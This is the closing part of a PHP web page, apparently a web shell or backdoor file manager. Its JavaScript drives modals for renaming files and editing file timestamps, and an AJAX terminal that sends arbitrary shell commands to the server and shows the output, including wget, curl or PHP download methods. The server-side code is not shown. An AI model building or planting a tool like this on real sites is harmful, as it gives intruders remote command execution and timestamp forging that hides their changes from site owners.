        document.getElementById('touchTime').value = year + '-' + month + '-' + day + 'T' + hours + ':' + minutes;
        showModal('touchModal');
    }
    
    function showRename(file) {
        document.getElementById('renameOld').value = file;
        document.getElementById('renameNew').value = file;
        showModal('renameModal');
        document.getElementById('renameNew').focus();
        document.getElementById('renameNew').select();
    }
    
    function setCmd(cmd) {
        document.getElementById('cmdInput').value = cmd;
        document.getElementById('cmdInput').focus();
    }
    
    function escapeHtml(str) {
        if (!str) return '';
        return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#039;');
    }
    
    document.addEventListener('DOMContentLoaded', function() {
        // Select All
        var selAll = document.getElementById('selectAll');
        if (selAll) {
            selAll.addEventListener('change', function(e) {
                document.querySelectorAll('.cb').forEach(function(cb) { cb.checked = e.target.checked; });
            });
        }
        
        // Close modal on ESC
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') {
                document.querySelectorAll('.modal').forEach(function(m) { m.style.display = 'none'; });
            }
        });
        
        // Close modal on click outside
        document.querySelectorAll('.modal').forEach(function(m) {
            m.addEventListener('click', function(e) {
                if (e.target === this) this.style.display = 'none';
            });
        });
        
        // AJAX Terminal
        var termForm = document.getElementById('termForm');
        if (termForm) {
            termForm.addEventListener('submit', function(e) {
                e.preventDefault();
                var cmd = document.getElementById('cmdInput').value.trim();
                if (!cmd) return;
                
                var out = document.getElementById('termOutput');
                var path = '<?php echo addslashes($current_dir); ?>';
                
                out.innerHTML = '<div style="color:#1a237e;text-align:center;padding:15px;font-weight:700;">⏳ Running...</div>';
                
                fetch(window.location.href, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'ajax=1&cmd=' + encodeURIComponent(cmd) + '&path=' + encodeURIComponent(path)
                })
                .then(function(r) { return r.json(); })
                .then(function(data) {
                    if (data.error) {
                        out.innerHTML = '<div style="color:#c62828;padding:12px;font-weight:700;">Error: ' + escapeHtml(data.error) + '</div>';
                        return;
                    }
                    var output = data.output || 'No output';
                    var status = data.status || '';
                    var isOk = status && status.includes('SUCCESS');
                    var isDownload = data.method && (data.method === 'wget' || data.method === 'curl' || data.method === 'php');
                    
                    var statusColor = isOk ? '#2e7d32' : '#c62828';
                    var methodText = data.method ? '⚡ ' + data.method : '';
                    
                    out.innerHTML = 
                        '<div style="margin-top:10px;padding:12px;background:rgba(0,0,0,0.3);border-radius:8px;border-left:6px solid ' + statusColor + ';">' +
                        '<div style="color:' + statusColor + ';font-weight:700;font-size:12px;margin-bottom:4px;">' + escapeHtml(status) + ' ' + methodText + '</div>' +
                        '<pre style="color:#aed581;font-family:monospace;font-size:12px;white-space:pre-wrap;word-wrap:break-word;margin:0;">' + escapeHtml(output) + '</pre>' +
                        '</div>';
                    
                    document.getElementById('cmdInput').value = '';
                })
                .catch(function(err) {
                    out.innerHTML = '<div style="color:#c62828;padding:12px;font-weight:700;">Error: ' + escapeHtml(err.toString()) + '</div>';
                });
            });
        }
    });
    </script>
</body>
</html>
